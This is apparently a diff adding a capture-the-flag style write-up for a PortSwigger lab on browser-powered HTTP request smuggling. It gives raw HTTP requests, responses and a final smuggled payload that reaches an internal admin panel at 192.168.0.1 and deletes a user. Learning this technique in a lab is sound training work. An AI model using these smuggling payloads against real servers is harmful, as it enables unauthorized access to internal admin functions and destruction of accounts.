@@ -241,4 +241,109 @@ reading material: https://portswigger.net/research/browser-powered-desync-attack
 to solve the lab: exploit this behavior to access an internal admin panel located at 192.168.0.1/admin, then delete the user carlos. 
 
 
+first - lets validate we can smuggle (remember to uncheck "update content length" in repeater options on the upper tab):
+1. find a post request to exploit -in this lab we only have the login request using the POST method:
+```
+POST /login HTTP/1.1
+Host: 0a22006403f519bfc0ee6fef00d90004.web-security-academy.net
+Cookie: _lab=45%7cMCsCFHGopX02kALZTXNwpcgO6gj6BiAUAhMZPJSZh%2f16OPjKhQkCbw%2bapG8FYROs6DJu669XAnYH6gLFugq5zxU5EuOv8O%2fYDnUmA1HwEQq7bC5IScyo2kVxSwxvdKkYWJgvEFk3GfgTbjocb8F2h%2fVSAbFaGcgjgRHYYaCTJR7lwg%3d%3d; session=ZW5QknB5pD7Iy2LgDqxjfctfRqawb06I
+Content-Length: 61
+
+
+csrf=zi9TIKrlUGeQ38CAuM197KLRHyohbgSg&username=x&password=y
+```
+
+
+2.lets send it to repeater and add smuggled request to it (while zeroing the CL value):
+```
+POST /login HTTP/1.1
+Host: 0a22006403f519bfc0ee6fef00d90004.web-security-academy.net
+Cookie: _lab=45%7cMCsCFHGopX02kALZTXNwpcgO6gj6BiAUAhMZPJSZh%2f16OPjKhQkCbw%2bapG8FYROs6DJu669XAnYH6gLFugq5zxU5EuOv8O%2fYDnUmA1HwEQq7bC5IScyo2kVxSwxvdKkYWJgvEFk3GfgTbjocb8F2h%2fVSAbFaGcgjgRHYYaCTJR7lwg%3d%3d; session=ZW5QknB5pD7Iy2LgDqxjfctfRqawb06I
+Content-Length: 0
+
+GET /admin/ HTTP/1.1
+Host: 192.168.0.1
+Cookie: _lab=45%7cMCsCFHGopX02kALZTXNwpcgO6gj6BiAUAhMZPJSZh%2f16OPjKhQkCbw%2bapG8FYROs6DJu669XAnYH6gLFugq5zxU5EuOv8O%2fYDnUmA1HwEQq7bC5IScyo2kVxSwxvdKkYWJgvEFk3GfgTbjocb8F2h%2fVSAbFaGcgjgRHYYaCTJR7lwg%3d%3d; session=ZW5QknB5pD7Iy2LgDqxjfctfRqawb06I
+```
+3. now we are getting somewhere! it seems we got some sort of admin page:
+```
+HTTP/1.1 400 Bad Request
+Content-Type: application/json; charset=utf-8
+Keep-Alive: timeout=10
+Content-Length: 26
+
+"Missing parameter 'csrf'"HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Cache-Control: no-cache
+Keep-Alive: timeout=10
+Content-Length: 2981
+
+<!DOCTYPE html>
+<html>
+    <head>
+    ...
+    ...
+    <form style='margin-top: 1em' class='login-form' action='/admin/delete' method='POST'>
+                            <input required type="hidden" name="csrf" value="zi9TIKrlUGeQ38CAuM197KLRHyohbgSg">
+                            <label>Username</label>
+                            <input required type='text' name='username'>
+                            <button class='button' type='submit'>Delete user</button>
+                        </form>
+```
+so it seeme our form use POST method and it require CSRF field.
+
+note that when deleting the original session, the CSRF value of the form keeps changing every time you submit, while it stays the same value if you keep the session cookie... i am not sure if this will be important so: - noted
+
+4. lets change our smuggled payload to POST, use the /admin/delete path,  calibrate the CL to include the CSRF (taken from the form) and the username to be deleted:
+
+```
+POST /admin/delete HTTP/1.1
+Host: 192.168.0.1
+Cookie: _lab=45%7cMCsCFHGopX02kALZTXNwpcgO6gj6BiAUAhMZPJSZh%2f16OPjKhQkCbw%2bapG8FYROs6DJu669XAnYH6gLFugq5zxU5EuOv8O%2fYDnUmA1HwEQq7bC5IScyo2kVxSwxvdKkYWJgvEFk3GfgTbjocb8F2h%2fVSAbFaGcgjgRHYYaCTJR7lwg%3d%3d; session=ZW5QknB5pD7Iy2LgDqxjfctfRqawb06I
+Content-Length: 53
+
+csrf=zi9TIKrlUGeQ38CAuM197KLRHyohbgSg&username=carlos
+```
+
+**final paylod:**
+```
+POST /login HTTP/1.1
+Host: 0a22006403f519bfc0ee6fef00d90004.web-security-academy.net
+Cookie: _lab=45%7cMCsCFHGopX02kALZTXNwpcgO6gj6BiAUAhMZPJSZh%2f16OPjKhQkCbw%2bapG8FYROs6DJu669XAnYH6gLFugq5zxU5EuOv8O%2fYDnUmA1HwEQq7bC5IScyo2kVxSwxvdKkYWJgvEFk3GfgTbjocb8F2h%2fVSAbFaGcgjgRHYYaCTJR7lwg%3d%3d; session=ZW5QknB5pD7Iy2LgDqxjfctfRqawb06I
+Content-Length: 0
+
+POST /admin/delete HTTP/1.1
+Host: 192.168.0.1
+Cookie: _lab=45%7cMCsCFHGopX02kALZTXNwpcgO6gj6BiAUAhMZPJSZh%2f16OPjKhQkCbw%2bapG8FYROs6DJu669XAnYH6gLFugq5zxU5EuOv8O%2fYDnUmA1HwEQq7bC5IScyo2kVxSwxvdKkYWJgvEFk3GfgTbjocb8F2h%2fVSAbFaGcgjgRHYYaCTJR7lwg%3d%3d; session=ZW5QknB5pD7Iy2LgDqxjfctfRqawb06I
+Content-Length: 53
+
+csrf=zi9TIKrlUGeQ38CAuM197KLRHyohbgSg&username=carlos
+```
+response 302 to our payload (and orange bar of success!):
+```
+HTTP/1.1 400 Bad Request
+Content-Type: application/json; charset=utf-8
+Keep-Alive: timeout=10
+Content-Length: 26
+
+"Missing parameter 'csrf'"HTTP/1.1 302 Found
+Location: /
+Keep-Alive: timeout=10
+Content-Length: 0
+```
+
+**smuggled!**
+
+
+
+
+
+
+
+
+
+
+
+
+
 
